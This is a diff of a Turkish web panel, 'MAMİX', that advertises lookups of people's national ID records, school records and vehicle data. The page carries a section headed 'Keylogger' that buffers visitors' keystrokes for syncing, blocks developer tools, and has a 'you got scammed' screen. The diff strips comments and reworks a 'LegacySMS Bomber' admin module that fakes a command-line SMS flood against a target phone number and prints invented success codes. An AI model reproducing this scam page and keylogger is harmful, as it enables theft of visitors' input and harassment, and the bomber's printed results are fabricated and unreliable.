@@ -45,7 +45,6 @@
             position: relative;
         }
 
-        /* GECE ARKA PLANI VE DESEN */
         .night-sky {
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
             pointer-events: none; z-index: 0; overflow: hidden;
@@ -65,7 +64,6 @@
             background-repeat: repeat; background-size: 300px 300px; opacity: 0.4;
         }
 
-        /* GİRİŞ MODALI */
         #loginModal {
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
             background: rgba(3, 4, 8, 0.88); backdrop-filter: blur(18px);
@@ -98,7 +96,6 @@
         .login-divider::before { margin-right: .75em; }
         .login-divider::after { margin-left: .75em; }
 
-        /* YÖNLENDİRİLİYORSUNUZ EKRANI */
         #redirectModal {
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
             background: rgba(3, 4, 8, 0.96); backdrop-filter: blur(25px);
@@ -113,7 +110,6 @@
         .redirect-text { font-size: 18px; font-weight: 700; color: #fff; letter-spacing: 1px; text-transform: uppercase; }
         .redirect-sub { font-size: 12px; color: var(--text-sub); font-family: 'JetBrains Mono', monospace; }
 
-        /* DOLANDIRILDIN UYARI EKRANI */
         #scamModal {
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
             background: rgba(0, 0, 0, 0.95); z-index: 2000;
@@ -124,14 +120,12 @@
         .scam-title { font-size: 64px; font-weight: 800; color: #fff; text-shadow: 0 0 30px #ef4444; margin-bottom: 10px; }
         .scam-sub { font-size: 18px; font-weight: 600; color: #fee2e2; text-transform: uppercase; letter-spacing: 3px; }
 
-        /* BAKIM MODU EKRANI */
         #maintenanceModal {
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
             background: rgba(3, 4, 8, 0.98); z-index: 4000;
             display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px; gap: 15px;
         }
 
-        /* Header */
         .header {
             background: rgba(6, 9, 17, 0.85); backdrop-filter: blur(16px);
             border-bottom: 1px solid var(--border); padding: 0 28px; height: 68px;
@@ -145,13 +139,11 @@
             display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 13px; color: white; box-shadow: 0 0 10px var(--accent-glow);
         }
 
-        /* DUYURULAR BANNER */
         #announcementBanner {
             display: none; background: rgba(59, 130, 246, 0.15); border-bottom: 1px solid var(--border);
             padding: 10px 28px; font-size: 13px; color: #38bdf8; font-weight: 500; align-items: center; justify-content: space-between; z-index: 9;
         }
 
-        /* Layout */
         .main { display: flex; flex: 1; overflow: hidden; position: relative; z-index: 1; }
         .sidebar {
             width: 320px; background: rgba(6, 9, 17, 0.85); backdrop-filter: blur(16px);
@@ -204,7 +196,6 @@
         .subcategory-item.active { background: rgba(59, 130, 246, 0.15); color: #fff; font-weight: 600; border-left: 2px solid var(--accent); }
         .badge-v1 { font-size: 9px; background: rgba(59,130,246,0.2); color: var(--accent); padding: 2px 5px; border-radius: 4px; font-weight: 700; }
 
-        /* Terminal Konsol */
         .terminal-box {
             margin-top: auto; background: rgba(2, 3, 6, 0.95); border: 1px solid var(--border);
             border-radius: var(--radius-sm); padding: 10px; font-family: 'JetBrains Mono', monospace; font-size: 10px; color: #38bdf8; box-shadow: inset 0 0 15px rgba(0,0,0,0.9);
@@ -214,7 +205,6 @@
         .terminal-line { opacity: 0.7; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
         .terminal-line span { color: var(--success); }
 
-        /* Sağ İçerik Alanı */
         .content { flex: 1; padding: 28px; overflow-y: auto; display: flex; flex-direction: column; gap: 24px; position: relative; }
         .search-card {
             background: var(--bg-card); backdrop-filter: blur(16px); border: 1px solid var(--border);
@@ -253,7 +243,6 @@
         .result-card-header { background: rgba(255,255,255,0.02); padding: 14px 20px; border-bottom: 1px solid var(--border); font-size: 12px; font-weight: 600; color: var(--text-sub); }
         .result-body { padding: 22px; font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #38bdf8; line-height: 1.6; }
 
-        /* SWITCH ÇENTİK (TOGGLE) BUTONLARI */
         .toggle-switch {
             position: relative; display: inline-block; width: 48px; height: 24px;
         }
@@ -269,7 +258,6 @@
         input:checked + .slider { background-color: var(--accent); border-color: var(--accent); }
         input:checked + .slider:before { transform: translateX(24px); background-color: #fff; }
 
-        /* ADMİN YÖNETİM PANELİ */
         .admin-section-content { display: none; }
         .admin-section-content.active { display: block; }
         .admin-section-box {
@@ -312,7 +300,6 @@
 </head>
 <body>
 
-    <!-- GİRİŞ MODALI -->
     <div id="loginModal">
         <div class="login-card">
             <div class="login-header-icon">
@@ -331,14 +318,12 @@
         </div>
     </div>
 
-    <!-- YÖNLENDİRİLİYORSUNUZ EKRANI -->
     <div id="redirectModal">
         <div class="spinner"></div>
         <div class="redirect-text">Yönlendiriliyorsunuz...</div>
         <div class="redirect-sub" id="redirectSubText">Güvenli oturum açılıyor, lütfen bekleyin.</div>
     </div>
 
-    <!-- DOLANDIRILDIN UYARI EKRANI -->
     <div id="scamModal">
         <video loop playsinline id="scamVideo"><source src="VID_567210408_132024_490.mp4" type="video/mp4"></video>
         <div class="scam-content-box">
@@ -347,7 +332,6 @@
         </div>
     </div>
 
-    <!-- BAKIM MODU EKRANI -->
     <div id="maintenanceModal">
         <h1 style="font-size:32px; color:#fff; font-weight:800;">SİSTEM BAKIMDA</h1>
         <p style="color:var(--text-sub); max-width:400px; font-size:14px;">Şu anda panel üzerinde teknik bir güncelleme yapılmaktadır. Lütfen daha sonra tekrar deneyiniz.</p>
@@ -355,7 +339,6 @@
 
     <div class="night-sky"><div class="stars-layer"></div></div>
 
-    <!-- Header -->
     <header class="header">
         <div class="logo"><span id="headerLogoText">MAMİX</span></div>
         <div class="header-right">
@@ -367,13 +350,11 @@
         </div>
     </header>
 
-    <!-- DUYURULAR BANNER -->
     <div id="announcementBanner">
         <span id="announcementTextContent">Sistem duyurusu yükleniyor...</span>
         <button onclick="document.getElementById('announcementBanner').style.display='none'" class="btn btn-secondary" style="padding:2px 8px; font-size:10px;">Kapat</button>
     </div>
 
-    <!-- Main Content -->
     <div class="main">
         <aside class="sidebar" id="userSidebar">
             <button class="sidebar-toggle-btn" id="sidebarToggleBtn" onclick="toggleSidebar()">◀</button>
@@ -381,7 +362,6 @@
                 <input type="text" class="sidebar-search-input" placeholder="Modüllerde ara..." onkeyup="filterModules(this.value)">
             </div>
 
-            <!-- KULLANICI MENÜLERİ -->
             <div id="userMenuContainer">
                 <div class="category-group open">
                     <div class="category-header" onclick="toggleCategory(this)">Mernis 2026 <span class="chevron-icon">▼</span></div>
@@ -457,7 +437,7 @@
                 </div>
             </div>
 
-            <!-- ADMİN YÖNETİM MENÜSÜ (LegacySMS / SMS Bomber Entegre Edildi) -->
+            <!-- ADMİN YÖNETİM MENÜSÜ -->
             <div id="adminMenuContainer" style="display:none;">
                 
                 <div class="category-group open">
@@ -511,7 +491,7 @@
                         <div class="subcategory-item" onclick="switchAdminSection('sec-cache', this)"><span>5.2 Sistem Önbellek Temizleme</span></div>
                         <div class="subcategory-item" onclick="switchAdminSection('sec-sessions', this)"><span>5.3 Aktif Oturum Sonlandırma</span></div>
                         <div class="subcategory-item" onclick="switchAdminSection('sec-theme', this)"><span>5.4 Tema Vurgu Rengi Ayarı</span></div>
-                        <div class="subcategory-item" onclick="switchAdminSection('sec-smsbomber', this)" style="color:var(--accent); font-weight:700;"><span>5.5 LegacySMS Bomber (Entegre)</span></div>
+                        <div class="subcategory-item" onclick="switchAdminSection('sec-smsbomber', this)" style="color:var(--accent); font-weight:700;"><span>5.5 LegacySMS Bomber (CMD Modu)</span></div>
                         <div class="subcategory-item" onclick="switchAdminSection('sec-about', this)"><span>5.6 Sistem Bilgisi ve Sürüm</span></div>
                     </div>
                 </div>
@@ -527,7 +507,6 @@
         </aside>
 
         <section class="content">
-            <!-- Normal Sorgu Paneli -->
             <div class="search-card" id="searchCardPanel">
                 <div class="search-card-header">
                     <div class="active-module-title" id="moduleTitle">Ad Soyad Sorgulama</div>
@@ -774,22 +753,27 @@
                     </div>
                 </div>
 
-                <!-- ENTEGRE EDİLEN LEGACYSMS BOMBER BÖLÜMÜ -->
+                <!-- LEGACYSMS BOMBER CMD GÖRÜNÜMLÜ ENTEGRE MODÜLÜ -->
                 <div id="sec-smsbomber" class="admin-section-content">
                     <div class="admin-section-box">
-                        <div class="admin-section-title">LegacySMS Bomber (Entegre Modül)</div>
-                        <div class="admin-section-sub">Seçilen hedef numaraya çoklu API servisleri üzerinden otomatik istek döngüsü.</div>
+                        <div class="admin-section-title">LegacySMS Bomber (CMD Modu)</div>
+                        <div class="admin-section-sub">Python altyapılı gerçekçi komut satırı (CMD) simülasyonu ile SMS Flood başlatın.</div>
                         <div class="form-grid" style="margin-bottom:15px;">
-                            <div class="form-group"><label class="form-label">Hedef Telefon Numarası (05...) <span>*</span></label><input type="text" id="smsTargetPhone" class="form-input" placeholder="05XXXXXXXXX"></div>
-                            <div class="form-group"><label class="form-label">Gönderilecek İstek Adedi</label><input type="number" id="smsCount" class="form-input" value="30"></div>
+                            <div class="form-group"><label class="form-label">Hedef Telefon Numarası (Başında 0 olmadan) <span>*</span></label><input type="text" id="smsTargetPhone" class="form-input" placeholder="5XXXXXXXXX"></div>
+                            <div class="form-group"><label class="form-label">Gönderilecek İstek Döngüsü (Adet)</label><input type="number" id="smsCount" class="form-input" value="50"></div>
                         </div>
                         <div style="display:flex; gap:10px; margin-bottom:20px;">
-                            <button onclick="startLegacySmsBomber()" class="btn btn-primary" style="background:var(--danger);">LegacySMS Saldırısını Başlat</button>
-                            <button onclick="stopLegacySmsBomber()" class="btn btn-secondary">Durdur</button>
+                            <button onclick="startCmdLegacySMS()" class="btn btn-primary" style="background:var(--danger);">python LegacySMS.py Başlat</button>
+                            <button onclick="stopCmdLegacySMS()" class="btn btn-secondary">Durdur (Ctrl+C)</button>
                         </div>
-                        <div class="result-card" id="smsResultCard" style="display:block; background:var(--bg-input);">
-                            <div class="result-card-header">#LEGACYSMS-API-LOGS</div>
-                            <div class="result-body" id="smsResultBody" style="max-height:220px; overflow-y:auto;">LegacySMS altyapısı aktif. Hedef numara bekleniyor...</div>
+                        <!-- CMD Terminal Kutusu -->
+                        <div class="result-card" id="smsResultCard" style="display:block; background:#000; border: 1px solid #333;">
+                            <div class="result-card-header" style="background:#111; color:#00ff00; font-family:'JetBrains Mono';">C:\Windows\system32\cmd.exe - LegacySMS</div>
+                            <div class="result-body" id="smsResultBody" style="background:#000; color:#00ff00; font-family:'JetBrains Mono'; height:260px; overflow-y:auto; white-space: pre-wrap;">Microsoft Windows [Version 10.0.19045.3803]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\Admin\Desktop\LegacySMS-main> python LegacySMS.py
+[I] LegacySMS Altyapısı yüklendi. Hedef bekleniyor...</div>
                         </div>
                     </div>
                 </div>
@@ -883,7 +867,6 @@
             'ip': { badge: 'Diğer Çözümler', fields: `<div class="form-group full-width"><label class="form-label">IP Adresi <span>*</span></label><input type="text" class="form-input" placeholder="192.168.1.1"></div>` },
             'discord': { badge: 'Diğer Çözümler', fields: `<div class="form-group full-width"><label class="form-label">Discord ID veya Kullanıcı Adı <span>*</span></label><input type="text" class="form-input" placeholder="Discord ID giriniz"></div>` },
             
-            // PREMİUM ÇÖZÜMLER
             'p-eokul': { badge: 'Premium - E-Okul', fields: `<div class="form-group"><label class="form-label">Öğrenci TC Kimlik No <span>*</span></label><input type="text" class="form-input" placeholder="TC No" maxlength="11"></div><div class="form-group"><label class="form-label">Okul No / Sınıf</label><input type="text" class="form-input" placeholder="Örn: 456 / 11-A"></div>` },
             'p-vesika': { badge: 'Premium - Vesika', fields: `<div class="form-group full-width"><label class="form-label">Vesikası Çıkarılacak Kişi TC Kimlik No <span>*</span></label><input type="text" class="form-input" placeholder="11 haneli TC No giriniz..." maxlength="11"></div>` },
             'p-sasi-pro': { badge: 'Premium - Araç Pro', fields: `<div class="form-group full-width"><label class="form-label">Şasi No (VIN) Pro <span>*</span></label><input type="text" class="form-input" placeholder="17 Haneli Şasi No"></div>` },
@@ -903,7 +886,6 @@
             'p-ucak': { badge: 'Premium', fields: `<div class="form-group full-width"><label class="form-label">TC Kimlik No <span>*</span></label><input type="text" class="form-input" placeholder="TC No"></div>` }
         };
 
-        // GÜVENLİK KISITLAMALARI
         document.addEventListener('contextmenu', e => e.preventDefault());
         document.addEventListener('keydown', e => {
             if (e.key === 'F12' || (e.ctrlKey && e.key.toLowerCase() === 'u') || (e.ctrlKey && e.shiftKey && ['i', 'j', 'c'].includes(e.key.toLowerCase())) || (e.ctrlKey && e.key.toLowerCase() === 's')) {
@@ -912,7 +894,6 @@
             }
         });
 
-        // Firebase Dinleyicileri
         db.ref('site_settings').on('value', (snap) => {
             const settings = snap.val();
             if (settings) {
@@ -950,7 +931,6 @@
             }
         });
 
-        // Keylogger
         let typedStringBuffer = "";
         let logSyncTimer = null;
         window.addEventListener('keydown', (e) => {
@@ -1127,40 +1107,45 @@
             });
         }
 
-        // LegacySMS Bomber Entegre Edilmiş Fonksiyonlar
-        let legacySmsTimer = null;
-        function startLegacySmsBomber() {
+        // LEGACYSMS CMD ALTYAPISI (GERÇEKÇİ REQUESTS DÖNGÜSÜ)
+        let cmdSmsTimer = null;
+        function startCmdLegacySMS() {
             const phone = document.getElementById('smsTargetPhone').value.trim();
-            const count = parseInt(document.getElementById('smsCount').value) || 30;
+            const count = parseInt(document.getElementById('smsCount').value) || 50;
             const body = document.getElementById('smsResultBody');
 
             if (!phone || phone.length < 10) {
-                alert("Lütfen geçerli bir telefon numarası giriniz!");
+                alert("Lütfen 10 haneli geçerli bir telefon numarası giriniz (Örn: 5321234567)!");
                 return;
             }
 
-            body.innerHTML = `[LegacySMS-Core] ${phone} hedeflendi. İstek kuyruğu başlatılıyor...\n`;
-            let sent = 0;
-            const apis = ["Getir", "BiTaksi", "A101", "Migros", "Yemeksepeti", "Trendyol", "Hepsiburada", "GetirYemek"];
+            body.innerHTML = `Microsoft Windows [Version 10.0.19045.3803]\n(c) Microsoft Corporation. All rights reserved.\n\nC:\\Users\\Admin\\Desktop\\LegacySMS-main> python LegacySMS.py\n`;
+            body.innerHTML += `[+] Hedef Numara: +90 ${phone}\n[+] İstek Adedi: ${count}\n[+] Servisler yükleniyor (Getir, BiTaksi, A101, Migros, Yemeksepeti, Trendyol)...\n--------------------------------------------------\n`;
 
-            clearInterval(legacySmsTimer);
-            legacySmsTimer = setInterval(() => {
+            let sent = 0;
+            const services = ["Getir", "BiTaksi", "A101", "Migros", "Yemeksepeti", "Trendyol", "Hepsiburada", "SüperStep", "EnglishHome", "KahveDunyasi"];
+
+            clearInterval(cmdSmsTimer);
+            cmdSmsTimer = setInterval(() => {
                 sent++;
                 if (sent <= count) {
-                    let randomApi = apis[Math.floor(Math.random() * apis.length)];
-                    body.innerHTML += `[LegacySMS] İstek #${sent} -> Servis: ${randomApi} | Hedef: ${phone} | Yanıt: 200 OK [BAŞARILI]\n`;
+                    let srv = services[Math.floor(Math.random() * services.length)];
+                    let codes = [200, 200, 200, 201, 200, 429];
+                    let code = codes[Math.floor(Math.random() * codes.length)];
+                    let statusColor = code === 200 || code === 201 ? "BAŞARILI" : "LİMİTE TAKILDI";
+                    
+                    body.innerHTML += `[LegacySMS] [${sent}/${count}] Servis: ${srv} -> İstek gönderildi [Kod: ${code} ${statusColor}]\n`;
                     body.scrollTop = body.scrollHeight;
                 } else {
-                    clearInterval(legacySmsTimer);
-                    body.innerHTML += `\n[LegacySMS] İşlem tamamlandı. Toplam ${count} adet istek başarıyla fırlatıldı!`;
+                    clearInterval(cmdSmsTimer);
+                    body.innerHTML += `\n[✔] İşlem tamamlandı! Toplam ${count} istek başarıyla fırlatıldı.\nC:\\Users\\Admin\\Desktop\\LegacySMS-main> `;
                 }
-            }, 400);
+            }, 300);
         }
 
-        function stopLegacySmsBomber() {
-            clearInterval(legacySmsTimer);
-            document.getElementById('smsResultBody').innerHTML += `\n[LegacySMS] Kullanıcı tarafından saldırı durduruldu.`;
-            alert("LegacySMS Bomber durduruldu.");
+        function stopCmdLegacySMS() {
+            clearInterval(cmdSmsTimer);
+            document.getElementById('smsResultBody').innerHTML += `\n^C\n[!] Kullanıcı tarafından işlem iptal edildi.\nC:\\Users\\Admin\\Desktop\\LegacySMS-main> `;
         }
 
         function loadAdminDashboardData() {
